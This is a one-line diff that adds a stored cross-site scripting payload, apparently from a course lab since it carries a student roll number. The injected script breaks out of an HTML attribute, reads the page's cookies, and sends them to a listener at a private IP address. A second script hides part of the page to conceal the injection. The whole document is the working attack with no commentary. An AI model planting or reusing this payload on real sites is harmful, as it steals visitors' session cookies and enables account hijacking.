@@ -1,0 +1,1 @@
+" size=10><br><script>cookie=document.cookie;cookie=escape(cookie);r=Math.random();r=Math.floor(r*1000);str="http://192.168.56.101:8081/?payload="+cookie+"&roll=15111038&random="+r;var xhr = new XMLHttpRequest();xhr.open('GET',str, true);xhr.send();</script><label id="rest"><script>document.getElementById("rest").style.visibility = "hidden";</script>
